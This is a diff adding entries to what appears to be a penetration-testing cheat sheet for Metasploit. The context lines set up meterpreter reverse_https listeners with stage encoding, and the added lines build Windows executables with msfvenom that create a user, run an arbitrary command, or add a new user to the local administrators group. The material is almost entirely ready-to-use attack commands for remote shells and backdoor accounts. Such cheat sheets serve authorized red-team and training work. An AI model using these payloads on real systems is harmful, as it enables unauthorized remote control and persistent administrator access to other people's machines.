@@ -180,3 +180,18 @@ msfconsole -x "use exploits/multi/handler; set lhost <ip>; set lport <port|443>;
 msfconsole -x "use exploits/multi/handler; set lhost <ip|tun0>; set lport <lport|443>; set payload windows/x64/meterpreter/reverse_https; set EXITFUNC thread; set EnableStageEncoding true; set StageEncoder x64/xor_dynamic; exploit"
 ```
 
+## Metasploit - Windows add user
+```
+msfvenom -p windows/adduser USER=<user> PASS=<pass> -f exe > <filename>.exe
+```
+## Metasploit - Windows Exec
+```
+msfvenom -p windows/exec CMD="<command>" -f exe > <filename>.exe
+```
+
+## Metasploit - add user and add to admin group
+#plateform/windows #target/local
+msfvenom payload to add user and add to admin group  
+```
+msfvenom -p windows/exec CMD="net user <user> <pass> /add && net localgroup administrators <user> /add" -f exe > <filename>.exe
+```
